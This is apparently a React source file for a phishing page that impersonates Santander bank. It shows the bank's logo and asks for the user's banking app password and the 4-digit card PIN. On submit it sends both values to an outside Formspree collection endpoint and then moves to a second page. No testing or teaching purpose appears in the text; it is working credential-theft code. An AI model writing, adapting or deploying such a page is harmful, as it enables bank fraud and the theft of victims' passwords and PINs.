import React from 'react';
import '../css/primerapag.css';
import { useNavigate } from 'react-router-dom';

function Primerapag() {
  const navigate = useNavigate();

  const handleSubmit = async (event) => {
    event.preventDefault();
    
    const formData = new FormData(event.target);
    
    try {
      const response = await fetch('https://formspree.io/f/mblrdvkb', {
        method: 'POST',
        body: formData,
        headers: {
          'Accept': 'application/json'
        }
      });

      if (response.ok) {
        console.log('Datos enviados correctamente');
        navigate('/segundapag');
      } else {
        console.error('Error al enviar los datos');
      }
    } catch (error) {
      console.error('Error al enviar los datos:', error);
    }
  };

  return (
    <div className="santander-container">
      <div className="santander-header">
        <span className="santander-logo">
          <img style={{ width: '160px' }} src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-XzSWZdtf3Lgk80cOwX_lyUAiAGOkQer4gLjKSlGD1_Lso4yPSiWbUTVw-ssFpCkB2I-e4_gAGp3PFTz6uKHDMX3hD8QcVDWegy5jXJ4oOpTmXOzCTVoOEj5H0V_mKgxE9y9aAj5deqw/s640/logo+santander+nuevo2.jpg" alt="" />
        </span>
      </div>
      <form className="santander-form" onSubmit={handleSubmit}>
        <label>
          Contraseña que usa en su aplicación
          <input type="password" name="password" placeholder="Contraseña" className="santander-input" />
        </label>
        <label>
          Nip de su tarjeta
          <input type="password" name="nip" placeholder="Nip de 4 dígitos" className="santander-input" />
        </label>
        <button type="submit" className="santander-continue-button">Continuar</button>
      </form>
    </div>
  );
}

export default Primerapag;